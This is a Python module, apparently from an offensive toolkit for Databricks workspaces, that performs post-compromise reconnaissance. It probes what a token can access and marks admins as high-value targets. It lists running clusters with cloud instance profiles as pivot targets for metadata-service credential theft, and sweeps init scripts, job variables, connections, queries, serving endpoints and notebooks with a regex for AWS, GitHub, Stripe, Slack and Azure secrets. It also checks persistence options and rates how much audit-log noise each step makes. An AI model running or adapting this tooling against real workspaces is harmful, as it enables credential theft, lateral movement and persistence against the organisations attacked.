"""Recon module — cross-module composite commands"""

import json
import re
import time

from bb.core.db import now_iso, cache_age
from bb.core.display import console, next_step
from bb.core.crypto import encrypt
from rich import box
from rich.panel import Panel
from rich.table import Table


def run_whoami(w, conn, profile, flags):
    """Quick identity + blast radius summary"""
    console.print("\n[bold]Recon: Who Am I[/bold]\n")
    try:
        me           = w.current_user.me()
        groups       = [g.display or str(g.value) for g in (me.groups or [])]
        entitlements = [e.value for e in (me.entitlements or [])]
        is_admin     = "admins" in groups or any("admin" in g.lower() for g in groups)

        t = Table(box=box.SIMPLE, show_header=False, pad_edge=False)
        t.add_column("", style="dim", min_width=20)
        t.add_column("")
        t.add_row("Username",     me.user_name or "?")
        t.add_row("Display Name", me.display_name or "?")
        t.add_row("Admin",        "[red]YES — high-value target[/red]" if is_admin else "[green]No[/green]")
        t.add_row("Groups",       ", ".join(groups) if groups else "(none)")
        t.add_row("Entitlements", ", ".join(entitlements) if entitlements else "(none)")
        console.print(t)

        # Quick capability probe
        console.print("\n[bold]Capability Probe[/bold]\n")
        checks = [
            ("Users list",     lambda: list(w.users.list())),
            ("Secrets scopes", lambda: list(w.secrets.list_scopes())),
            ("Clusters list",  lambda: list(w.clusters.list())),
            ("Jobs list",      lambda: list(w.jobs.list())),
            ("UC catalogs",    lambda: list(w.catalogs.list())),
            ("Init scripts",   lambda: list(w.global_init_scripts.list())),
            ("IP lists",       lambda: list(w.ip_access_lists.list())),
        ]
        for label, fn in checks:
            try:
                result = fn()
                console.print(f"  [green]✓[/green]  {label:<22} [dim]({len(result)} items)[/dim]")
            except Exception as e:
                msg = str(e)[:60]
                console.print(f"  [red]✗[/red]  {label:<22} [dim]{msg}[/dim]")
        next_step("recon attack-surface --run",
                  "uc grants --name <username> --run",
                  "recon persist-check --run")
    except Exception as e:
        console.print(f"[red]Error: {e}[/red]")


def run_cloud_pivot(w, conn, profile, flags):
    """Find running clusters with instance profiles — IMDS pivot prerecon"""
    console.print("\n[bold]Recon: Cloud Pivot Targets[/bold]  "
                  "[dim]running clusters with instance profiles[/dim]\n")
    try:
        from databricks.sdk.service.compute import ListClustersFilterBy, State as CState
        clusters = list(w.clusters.list(
            filter_by=ListClustersFilterBy(cluster_states=[CState.RUNNING])
        ))
        now_ts = time.time()
        found  = 0

        t = Table(box=box.SIMPLE, show_header=True, pad_edge=False)
        t.add_column("Cluster ID",       style="cyan")
        t.add_column("Name")
        t.add_column("Owner")
        t.add_column("IAM Role / MSI")
        t.add_column("Window")

        for c in clusters:
            iprofile = (c.aws_attributes.instance_profile_arn if c.aws_attributes else None) or ""
            if not iprofile:
                continue
            found += 1
            auto_min  = c.autotermination_minutes or 0
            last_act  = c.last_restarted_time or 0
            if auto_min == 0:
                window = "[green]always-on[/green]"
            else:
                remaining = ((last_act / 1000) + (auto_min * 60)) - now_ts
                mins      = max(0, int(remaining / 60))
                color     = "green" if mins > 30 else ("yellow" if mins > 10 else "red")
                window    = f"[{color}]~{mins}m[/{color}]"
            t.add_row(c.cluster_id, c.cluster_name or "?",
                      c.creator_user_name or "?", iprofile, window)

        if found:
            console.print(t)
            console.print(f"\n  [dim]{found} pivot target(s)[/dim]")
            next_step("imds aws --cluster <cluster_id> --aggressive --run",
                      "secrets dump --cluster <cluster_id> --aggressive --run")
        else:
            console.print("[yellow]No running clusters with instance profiles found[/yellow]")
    except Exception as e:
        console.print(f"[red]Error: {e}[/red]")


def run_cred_hunt(w, conn, profile, flags):
    """Tiered passive credential sweep"""
    extended   = flags.get("extended", False)
    aggressive = flags.get("aggressive", False)
    cred_pat   = re.compile(
        r"(?i)(password|passwd|secret|token|api_?key|access_?key|credential|auth|bearer"
        r"|private_?key|client_?secret|conn(ection)?_?str(ing)?|sas_?token|webhook"
        # Databricks / AWS
        r"|dapi[0-9a-f]{32}|AKIA[0-9A-Z]{16}|ASIA[0-9A-Z]{16}"
        # GitHub / HuggingFace / Stripe / SendGrid / Slack
        r"|ghp_[A-Za-z0-9]|ghs_[A-Za-z0-9]|hf_[A-Za-z0-9]"
        r"|sk_live_|pk_live_|SG\.[A-Za-z0-9_-]|xox[bpas]-"
        # Azure
        r"|AccountKey=|DefaultEndpointsProtocol|SharedAccessSignature"
        r"|azure_client_secret|azure_storage_key|tenantid|clientid"
        r")",
    )

    console.print("\n[bold]Recon: Cred Hunt[/bold]\n")
    if extended:
        console.print("  [dim]Mode: extended (init scripts + jobs + UC connections + saved queries + serving)[/dim]\n")
    elif aggressive:
        console.print("  [dim]Mode: aggressive (+ secret extraction via cluster)[/dim]\n")
    else:
        console.print("  [dim]Mode: default (init scripts + jobs + UC connections)[/dim]\n")

    hits = []

    # ── Init scripts (admin) ─────────────────────────────
    console.print("[cyan]→ Global init scripts[/cyan]")
    try:
        import base64
        scripts = list(w.global_init_scripts.list())
        for s in scripts:
            try:
                full    = w.global_init_scripts.get(script_id=s.script_id)
                content = base64.b64decode(full.script or "").decode("utf-8", errors="replace")
                for i, line in enumerate(content.splitlines(), 1):
                    if cred_pat.search(line):
                        hits.append(("init-script", s.name or s.script_id, i, line.strip()))
            except Exception:
                pass
        console.print(f"  [dim]{len(scripts)} scripts scanned[/dim]")
    except Exception as e:
        console.print(f"  [red]{e}[/red]")

    # ── Job spark env vars + task base_parameters ───────
    console.print("[cyan]→ Job env vars / task params[/cyan]")
    try:
        job_list = list(w.jobs.list())
        now_ts   = now_iso()
        for j in job_list:
            try:
                full     = w.jobs.get(job_id=j.job_id)
                s        = full.settings
                jname    = (j.settings.name if j.settings else None) or str(j.job_id)
                env_vars = {}
                if s and getattr(s, "new_cluster", None) and s.new_cluster.spark_env_vars:
                    env_vars = s.new_cluster.spark_env_vars
                elif s and getattr(s, "spark_env_vars", None):
                    env_vars = s.spark_env_vars
                task_params = {}
                for task in (s.tasks if s else []) or []:
                    if task.notebook_task and task.notebook_task.base_parameters:
                        task_params.update(task.notebook_task.base_parameters)
                all_env = {**env_vars, **task_params}
                # Cache to jobs + job_configs so loot dump picks them up
                conn.execute(
                    "INSERT OR REPLACE INTO jobs VALUES (?,?,?,?,?)",
                    (str(j.job_id), jname,
                     s.email_notifications.on_failure[0] if (s and s.email_notifications
                         and s.email_notifications.on_failure) else None,
                     None, now_ts)
                )
                git_url = str(s.git_source.git_url if s and getattr(s, "git_source", None) else "")
                conn.execute(
                    "INSERT OR REPLACE INTO job_configs VALUES (?,?,?,?,?)",
                    (str(j.job_id), json.dumps({}),
                     encrypt(profile, json.dumps(all_env)),
                     git_url, now_ts)
                )
                for k, v in all_env.items():
                    if cred_pat.search(k) or cred_pat.search(v or ""):
                        hits.append(("job-env-var", f"{jname}/{k}", 0, v or ""))
            except Exception:
                pass
        conn.commit()
        console.print(f"  [dim]{len(job_list)} jobs scanned[/dim]")
    except Exception as e:
        console.print(f"  [red]{e}[/red]")

    # ── UC connections ───────────────────────────────────
    console.print("[cyan]→ UC connections[/cyan]")
    try:
        conns = list(w.connections.list())
        for c in conns:
            try:
                full    = w.connections.get(name=c.name)
                options = full.options or {}
                for k, v in options.items():
                    if cred_pat.search(k) or cred_pat.search(str(v)):
                        hits.append(("uc-connection", f"{c.name}/{k}", 0, str(v)))
            except Exception:
                pass
        console.print(f"  [dim]{len(conns)} connections scanned[/dim]")
    except Exception as e:
        console.print(f"  [red]{e}[/red]")

    if extended or aggressive:
        # ── Saved SQL queries ─────────────────────────────
        console.print("[cyan]→ Saved SQL queries[/cyan]")
        try:
            queries  = list(w.queries.list())
            now_ts2  = now_iso()
            for q in queries:
                try:
                    full  = w.queries.get(id=str(q.id))
                    qname = full.display_name or str(q.id)
                    conn.execute(
                        "INSERT OR REPLACE INTO saved_queries VALUES (?,?,?,?,?)",
                        (str(full.id), qname, full.query_text, full.owner_user_name, now_ts2)
                    )
                    for i, line in enumerate((full.query_text or "").splitlines(), 1):
                        if cred_pat.search(line):
                            hits.append(("saved-query", qname, i, line.strip()))
                except Exception:
                    pass
            conn.commit()
            console.print(f"  [dim]{len(queries)} queries scanned[/dim]")
        except Exception as e:
            console.print(f"  [red]{e}[/red]")

        # ── Serving endpoint env vars ─────────────────────
        console.print("[cyan]→ Serving endpoint env vars[/cyan]")
        try:
            endpoints = list(w.serving_endpoints.list())
            for ep in endpoints:
                try:
                    full   = w.serving_endpoints.get(name=ep.name)
                    config = full.config
                    if config:
                        for m in (config.served_models or []):
                            if hasattr(m, "environment_vars") and m.environment_vars:
                                for k, v in m.environment_vars.items():
                                    if cred_pat.search(k) or cred_pat.search(str(v)):
                                        hits.append(("serving-env",
                                                     f"{ep.name}/{m.model_name}/{k}",
                                                     0, str(v)))
                except Exception:
                    pass
            console.print(f"  [dim]{len(endpoints)} endpoints scanned[/dim]")
        except Exception as e:
            console.print(f"  [red]{e}[/red]")

    if aggressive:
        # ── Notebook content scan ─────────────────────────
        scan_path = flags.get("path") or "/"
        console.print(f"[cyan]→ Notebook content scan[/cyan]  [dim](path={scan_path})[/dim]")
        console.print("  [dim]Exporting notebooks — may be slow on large workspaces[/dim]")
        try:
            import base64
            from databricks.sdk.service.workspace import ObjectType

            def _walk(path):
                try:
                    for obj in w.workspace.list(path=path) or []:
                        if obj.object_type == ObjectType.DIRECTORY:
                            yield from _walk(obj.path)
                        elif obj.object_type in (ObjectType.NOTEBOOK, ObjectType.FILE):
                            yield obj
                except Exception:
                    pass

            nb_count = 0
            for obj in _walk(scan_path):
                try:
                    exported = w.workspace.export(path=obj.path)
                    content  = base64.b64decode(exported.content or "").decode("utf-8", errors="replace")
                    for i, line in enumerate(content.splitlines(), 1):
                        if cred_pat.search(line):
                            hits.append(("notebook", obj.path, i, line.strip()[:120]))
                    nb_count += 1
                except Exception:
                    pass
            console.print(f"  [dim]{nb_count} notebooks scanned[/dim]")
        except Exception as e:
            console.print(f"  [red]{e}[/red]")

    # ── Results ──────────────────────────────────────────
    console.print()
    if hits:
        console.print(f"[red][bold]{len(hits)} potential credential(s) found[/bold][/red]\n")
        t = Table(box=box.SIMPLE, show_header=True, pad_edge=False)
        t.add_column("Source",  style="dim")
        t.add_column("Location", style="cyan")
        t.add_column("Line", justify="right", style="dim")
        t.add_column("Value")
        for source, loc, line, value in hits:
            t.add_row(source, loc, str(line) if line else "", value[:80])
        console.print(t)
        next_step("recon cred-hunt --aggressive --run",
                  "workspace export --path <notebook_path> --run")
    else:
        console.print("[green]No credential patterns found[/green]")


def run_data_map(w, conn, profile, flags):
    """UC topology summary — catalogs/schemas/tables/external locations"""
    console.print("\n[bold]Recon: Data Map[/bold]\n")
    try:
        cats   = list(w.catalogs.list())
        locs   = list(w.external_locations.list())
        creds  = list(w.storage_credentials.list())

        console.print(f"  Catalogs           : {len(cats)}")
        console.print(f"  External Locations : {len(locs)}")
        console.print(f"  Storage Credentials: {len(creds)}")

        schema_count = 0
        table_count  = 0
        for cat in cats:
            try:
                schemas = list(w.schemas.list(catalog_name=cat.name))
                schema_count += len(schemas)
                for s in schemas:
                    try:
                        tables = list(w.tables.list(
                            catalog_name=cat.name, schema_name=s.name
                        ))
                        table_count += len(tables)
                    except Exception:
                        pass
            except Exception:
                pass

        console.print(f"  Schemas            : {schema_count}")
        console.print(f"  Tables             : {table_count}")
        console.print()

        if locs:
            console.print("[bold]External Locations[/bold]\n")
            for loc in locs:
                t = Table(box=box.SIMPLE, show_header=False, pad_edge=False)
                t.add_column("", style="dim",   min_width=12)
                t.add_column("", style="white")
                t.add_row("Name",       f"[cyan]{loc.name or '?'}[/cyan]")
                t.add_row("URL",        f"[yellow]{loc.url or '?'}[/yellow]")
                t.add_row("Credential", loc.credential_name or "?")
                console.print(t)
        next_step("uc temp-path-creds --path <url> --run",
                  "uc schema-meta --catalog <name> --schema <name> --warehouse <id> --run")
    except Exception as e:
        console.print(f"[red]Error: {e}[/red]")


def run_persist_check(w, conn, profile, flags):
    """R-only check of what persistence options are available before touching anything"""
    console.print("\n[bold]Recon: Persist Check[/bold]  [dim](read-only probe)[/dim]\n")

    checks = []

    # Current identity
    try:
        me     = w.current_user.me()
        groups = [g.display or str(g.value) for g in (me.groups or [])]
        is_admin = "admins" in groups or any("admin" in g.lower() for g in groups)
        checks.append(("create-token",           True,     "Can create PAT for self — always available"))
        checks.append(("create-obo-token",       is_admin, "Admin only — create token for service principals"))
        checks.append(("create-service-principal", is_admin, "Admin only"))
    except Exception:
        pass

    # Running clusters (for EXEC-based persistence)
    try:
        from databricks.sdk.service.compute import ListClustersFilterBy, State as CState
        clusters = list(w.clusters.list(
            filter_by=ListClustersFilterBy(cluster_states=[CState.RUNNING])
        ))
        has_clusters = len(clusters) > 0
        checks.append(("imds (exec)",  has_clusters, f"{len(clusters)} running cluster(s) available"))
        checks.append(("execute code", has_clusters, "Requires running cluster + CAN_ATTACH_TO"))
    except Exception:
        checks.append(("clusters",     False, "Could not enumerate"))

    # Service principals
    try:
        sps = list(w.service_principals.list())
        checks.append(("target SPs", len(sps) > 0, f"{len(sps)} service principals enumerated"))
    except Exception:
        pass

    t = Table(box=box.SIMPLE, show_header=True, pad_edge=False)
    t.add_column("Option",    style="cyan", min_width=28)
    t.add_column("Available")
    t.add_column("Notes",     style="dim")
    for option, avail, note in checks:
        avail_str = "[green]Yes[/green]" if avail else "[red]No[/red]"
        t.add_row(option, avail_str, note)
    console.print(t)

    avail_map = {c[0]: c[1] for c in checks}
    steps = ["persist create-token --run"]
    if avail_map.get("create-obo-token"):
        steps.append("persist create-obo-token --id <app_id> --run")
        steps.append("persist create-service-principal --run")
    if avail_map.get("imds (exec)"):
        steps.append("imds aws --cluster <cluster_id> --aggressive --run")
        steps.append("secrets dump --cluster <cluster_id> --aggressive --run")
    if avail_map.get("target SPs"):
        steps.append("identity service-principals --run")
    next_step(*steps)


def run_attack_surface(w, conn, profile, flags):
    """Blast radius assessment — what the current token can do"""
    console.print("\n[bold]Recon: Attack Surface[/bold]  [dim](blast radius of current token)[/dim]\n")

    tests = [
        ("identity.whoami",         lambda: w.current_user.me()),
        ("identity.users",          lambda: list(w.users.list())),
        ("identity.groups",         lambda: list(w.groups.list())),
        ("identity.ip-access-lists",lambda: list(w.ip_access_lists.list())),
        ("secrets.scopes",          lambda: list(w.secrets.list_scopes())),
        ("compute.clusters",        lambda: list(w.clusters.list())),
        ("compute.init-scripts",    lambda: list(w.global_init_scripts.list())),
        ("jobs.list",               lambda: list(w.jobs.list())),
        ("workspace.list",          lambda: list(w.workspace.list(path="/"))),
        ("workspace.git-creds",     lambda: list(w.git_credentials.list())),
        ("workspace.repos",         lambda: list(w.repos.list())),
        ("uc.catalogs",             lambda: list(w.catalogs.list())),
        ("uc.external-locations",   lambda: list(w.external_locations.list())),
        ("uc.storage-credentials",  lambda: list(w.storage_credentials.list())),
        ("uc.connections",          lambda: list(w.connections.list())),
        ("sql.warehouses",          lambda: list(w.warehouses.list())),
        ("sql.queries",             lambda: list(w.queries.list())),
        ("serving.endpoints",       lambda: list(w.serving_endpoints.list())),
        ("settings.workspace-conf", lambda: w.workspace_conf.get_status(keys="enableTokensConfig")),
    ]

    t = Table(box=box.SIMPLE, show_header=True, pad_edge=False)
    t.add_column("Module",   style="cyan", min_width=30)
    t.add_column("Access")
    t.add_column("Count",    justify="right", style="dim")

    for label, fn in tests:
        try:
            result    = fn()
            count     = len(result) if hasattr(result, "__len__") else "✓"
            t.add_row(label, "[green]Yes[/green]", str(count))
        except Exception as e:
            msg = str(e)[:50]
            t.add_row(label, "[red]No[/red]", f"[dim]{msg}[/dim]")

    console.print(t)
    next_step("recon persist-check --run",
              "recon cred-hunt --run",
              "recon cloud-pivot --run")


def run_search(w, conn, profile, flags):
    """Custom pattern search across notebooks, saved queries, job params, and init scripts"""
    pattern = flags.get("filter") or flags.get("name")
    if not pattern:
        pattern = input("Search pattern (regex): ").strip()
    scan_path = flags.get("path") or "/"

    try:
        pat = re.compile(pattern, re.IGNORECASE)
    except re.error as e:
        console.print(f"[red]Invalid regex: {e}[/red]")
        return

    console.print(f"\n[bold]Recon: Search[/bold]  [dim]pattern={pattern!r}  path={scan_path}[/dim]\n")
    hits = []

    # ── Notebooks ─────────────────────────────────────────
    console.print("[cyan]→ Notebooks[/cyan]")
    try:
        import base64
        from databricks.sdk.service.workspace import ObjectType

        def _walk(path):
            try:
                for obj in w.workspace.list(path=path) or []:
                    if obj.object_type == ObjectType.DIRECTORY:
                        yield from _walk(obj.path)
                    elif obj.object_type in (ObjectType.NOTEBOOK, ObjectType.FILE):
                        yield obj
            except Exception:
                pass

        nb_count = 0
        for obj in _walk(scan_path):
            try:
                exported = w.workspace.export(path=obj.path)
                content  = base64.b64decode(exported.content or "").decode("utf-8", errors="replace")
                for i, line in enumerate(content.splitlines(), 1):
                    if pat.search(line):
                        hits.append(("notebook", obj.path, i, line.strip()[:120]))
                nb_count += 1
            except Exception:
                pass
        console.print(f"  [dim]{nb_count} notebooks scanned[/dim]")
    except Exception as e:
        console.print(f"  [red]{e}[/red]")

    # ── Saved SQL queries ──────────────────────────────────
    console.print("[cyan]→ Saved queries[/cyan]")
    try:
        queries = list(w.queries.list())
        for q in queries:
            try:
                full  = w.queries.get(id=str(q.id))
                qname = full.display_name or str(q.id)
                for i, line in enumerate((full.query_text or "").splitlines(), 1):
                    if pat.search(line):
                        hits.append(("saved-query", qname, i, line.strip()[:120]))
            except Exception:
                pass
        console.print(f"  [dim]{len(queries)} queries scanned[/dim]")
    except Exception as e:
        console.print(f"  [red]{e}[/red]")

    # ── Job env vars / task params ─────────────────────────
    console.print("[cyan]→ Job params[/cyan]")
    try:
        jobs = list(w.jobs.list())
        for j in jobs:
            try:
                full  = w.jobs.get(job_id=j.job_id)
                s     = full.settings
                jname = (j.settings.name if j.settings else None) or str(j.job_id)
                kv    = {}
                if s and getattr(s, "new_cluster", None) and s.new_cluster.spark_env_vars:
                    kv.update(s.new_cluster.spark_env_vars)
                for task in (s.tasks if s else []) or []:
                    if task.notebook_task and task.notebook_task.base_parameters:
                        kv.update(task.notebook_task.base_parameters)
                for k, v in kv.items():
                    if pat.search(k) or pat.search(v or ""):
                        hits.append(("job-param", f"{jname}/{k}", 0, v or ""))
            except Exception:
                pass
        console.print(f"  [dim]{len(jobs)} jobs scanned[/dim]")
    except Exception as e:
        console.print(f"  [red]{e}[/red]")

    # ── Init scripts ───────────────────────────────────────
    console.print("[cyan]→ Init scripts[/cyan]")
    try:
        import base64 as _b64
        scripts = list(w.global_init_scripts.list())
        for s in scripts:
            try:
                full    = w.global_init_scripts.get(script_id=s.script_id)
                content = _b64.b64decode(full.script or "").decode("utf-8", errors="replace")
                for i, line in enumerate(content.splitlines(), 1):
                    if pat.search(line):
                        hits.append(("init-script", s.name or s.script_id, i, line.strip()[:120]))
            except Exception:
                pass
        console.print(f"  [dim]{len(scripts)} scripts scanned[/dim]")
    except Exception as e:
        console.print(f"  [red]{e}[/red]")

    # ── Results ────────────────────────────────────────────
    console.print()
    if hits:
        console.print(f"[bold]{len(hits)} match(es)[/bold]\n")
        t = Table(box=box.SIMPLE, show_header=True, pad_edge=False)
        t.add_column("Source",   style="dim")
        t.add_column("Location", style="cyan")
        t.add_column("Line",     justify="right", style="dim")
        t.add_column("Match")
        for source, loc, line, value in hits:
            t.add_row(source, loc, str(line) if line else "", value)
        console.print(t)
        next_step("workspace export --path <notebook_path> --run",
                  "workspace export --path <notebook_path> --output <file> --run")
    else:
        console.print("[green]No matches[/green]")


COMMANDS = {
    "whoami": {
        "description": "Identity + capability probe — what can this token do?",
        "activity": ["info"], "type": "R", "noise": "Low-Medium — ~7 API calls",
        "prereqs": [], "caveats": [], "flags": [],
        "fn": run_whoami,
    },
    "cloud-pivot": {
        "description": "Find running clusters with instance profiles — IMDS prerecon",
        "activity": ["latm", "info"], "type": "R", "noise": "Low",
        "prereqs": [],
        "caveats": ["Non-admin sees own clusters only"],
        "flags": [],
        "fn": run_cloud_pivot,
    },
    "cred-hunt": {
        "description": "Passive credential sweep across init scripts, job env vars, UC connections",
        "activity": ["cred"], "type": "R",
        "noise": "Medium — one get() per job/connection; High with --extended/--aggressive",
        "prereqs": [],
        "caveats": [
            "Default: init scripts + jobs (env vars + task params) + UC connections",
            "--extended adds saved SQL queries + serving endpoint env vars",
            "--aggressive also scans all notebook content (slow on large workspaces)",
        ],
        "flags": [
            ("--extended",    "Add saved queries + serving endpoint env vars to scan"),
            ("--path PATH",   "Limit notebook scan root (--aggressive only, default /)"),
        ],
        "aggressive": ["Notebook content export + scan"],
        "fn": run_cred_hunt,
    },
    "search": {
        "description": "Custom regex search across notebooks, saved queries, job params, init scripts",
        "activity": ["cred", "info"], "type": "R*",
        "noise": "Medium-High — exports all notebooks under path (R* client-side scan)",
        "prereqs": [],
        "caveats": ["Exports notebook content to scan locally — visible in workspace audit logs"],
        "flags": [
            ("--filter PATTERN", "Regex pattern to search (prompts if omitted)"),
            ("--path PATH",      "Workspace path to scan (default /)"),
        ],
        "fn": run_search,
    },
    "data-map": {
        "description": "UC topology summary — catalogs, schemas, tables, external locations",
        "activity": ["info", "data"], "type": "R*",
        "noise": "Medium-High — iterates all catalogs/schemas (R* client-side)",
        "prereqs": ["Unity Catalog enabled"],
        "caveats": ["Pulls all schemas/tables locally — can be slow on large workspaces"],
        "flags": [],
        "fn": run_data_map,
    },
    "persist-check": {
        "description": "Read-only probe of available persistence options",
        "activity": ["persist", "info"], "type": "R", "noise": "Low",
        "prereqs": [], "caveats": [], "flags": [],
        "fn": run_persist_check,
    },
    "attack-surface": {
        "description": "Blast radius assessment — probe all modules with current token",
        "activity": ["info"], "type": "R",
        "noise": "Medium — ~19 API calls across all modules",
        "prereqs": [], "caveats": [], "flags": [],
        "fn": run_attack_surface,
    },
}
